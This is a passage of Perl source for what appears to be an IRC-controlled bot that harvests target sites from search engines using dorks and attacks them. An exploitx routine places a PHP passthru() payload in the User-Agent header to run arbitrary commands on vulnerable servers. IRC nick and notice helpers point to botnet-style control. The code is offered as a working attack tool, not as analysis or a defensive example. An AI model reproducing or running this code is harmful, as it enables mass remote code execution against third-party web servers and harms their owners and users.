	while ($re =~ m/<br>os:(.+?)\<br>/g) {
		$os = $1;
		if ($1 =~ //) { $os = "Unkn0wN"; }
	}
}

sub getcontent() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub google() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $yahoo = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
        my $Res = query($yahoo);
        while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub blows() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub webde() {
    my @lst;
    my $key = $_[0];
    for ( $b = 0 ; $b <= 100 ; $b += 1 ) {
        my $UoL = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".key($key)."&y=0&x=0&mc=suche\@web\@navigation\@zahlen.suche\@web");
        my $Res = query($UoL);
        while ( $Res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g ) {
            my $k = $1;
            if ( $k !~ /<span class=\"url\">http:\/\/(.*?)<\/span>/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    for ($b=1;$b<=1000;$b+=10){
        my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub exploitx() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"ijoo#\"; passthru(\'".$rce."\'); echo \"#ijoo\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub links() {
	my @l;
	my $link = $_[0];
	my $host = $_[0];
	my $hdir = $_[0];
	$hdir =~ s/(.*)\/[^\/]*$/\1/;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host .= "/";
	$link .= "/";
	$hdir .= "/";
	$host =~ s/\/\//\//g;
	$hdir =~ s/\/\//\//g;
	$link =~ s/\/\//\//g;
	push( @l, $link, $host, $hdir );
	return @l;
}

sub key(){
	my $dork=$_[0];
	$dork =~ s/ /\+/g;
	$dork =~ s/:/\%3A/g;
	$dork =~ s/\//\%2F/g;
	$dork =~ s/&/\%26/g;
	$dork =~ s/\"/\%22/g;
	$dork =~ s/\\/\%5C/g;
	$dork =~ s/,/\%2C/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
	$dork =~ s/@/\%40/g;
	return $dork;
}

sub query($) {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host  = $url;
	my $query = $url;
	my $page  = "";
	$host  =~ s/href=\"?http:\/\///;
	$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ( $query eq "" ) { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
			print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3\r\n\r\n";
			my @r = <$sock>;
			$page = "@r";
			close($sock);
		};
	return $page;
}

sub calculate {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub nick {
	return unless $#_ == 0;
	sendraw("NICK $_[0]");
}

sub notice {
	return unless $#_ == 1;
	sendraw("NOTICE $_[0] :$_[1]");
}

